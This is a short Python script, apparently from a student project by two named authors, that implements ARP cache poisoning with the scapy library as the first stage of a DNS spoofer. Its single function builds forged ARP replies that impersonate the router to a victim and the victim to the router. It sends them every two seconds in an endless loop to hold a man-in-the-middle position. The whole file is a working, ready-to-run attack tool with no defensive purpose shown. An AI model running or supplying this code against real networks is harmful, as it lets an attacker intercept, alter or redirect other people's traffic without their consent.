#!/usr/bin/python

#-----------------------------------------------------------------------------
#-- SOURCE FILE:    arpSpoof.py -   Arp Poisoning for DNS Spoofer
#--
#-- FUNCTIONS:      arpSpoof(routerIP, routerMAC, victimIP, victimMAC, ourMAC)
#--
#-- DATE:           November 5, 2015
#--
#-- DESIGNERS:      Brij Shah, Callum Styan
#--
#-- PROGRAMMERS:    Brij Shah, Callum Styan
#--
#-- NOTES:
#-- arpSpoof sends out spoofed ARP packets to the victim machine and the router
#-- every two seconds. arpSpoof should be run in its own process and remotely
#-- killed if necessary.
#-----------------------------------------------------------------------------
import sys, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from time import sleep

#-----------------------------------------------------------------------------
#-- FUNCTION:       arpSpoof(routerIP, routerMAC, victimIP, victimMAC, ourMAC)
#--
#-- VARIABLES(S):   routerIP - the router's IP address
#--                 routerMAC - the router's MAC address
#--                 victimIP - the victim's IP address
#--                 victimMAC - the victim's MAC address
#--                 ourMAC - the current machines MAC address
#--
#-- NOTES:
#-- arpSpoof creates two packets, one for the victim machine and one for the
#-- router with the specified values. It then sends out the packets 
#-- continuously every two seconds to ARP poison the victim and initiate a 
#-- 'man-in-the-middle'.
#-----------------------------------------------------------------------------
def arpSpoof(routerIP, routerMAC, victimIP, victimMAC, ourMAC):
    arpPacketVictim = Ether(src=ourMAC
                           , dst=victimMAC)/ARP(hwsrc=ourMAC
                           , hwdst=victimMAC
                           , psrc=routerIP
                           , pdst=victimIP
                           , op=2)

    arpPacketRouter = Ether(src=ourMAC
                           , dst=routerMAC)/ARP(hwsrc=ourMAC
                           , hwdst=routerMAC
                           , psrc=victimIP
                           , pdst=routerIP
                           , op=2)
    while 1:
        try:
            sendp(arpPacketVictim, verbose=0)
            sendp(arpPacketRouter, verbose =0)
            time.sleep(2)
        except KeyboardInterrupt:
            sys.exit(0)
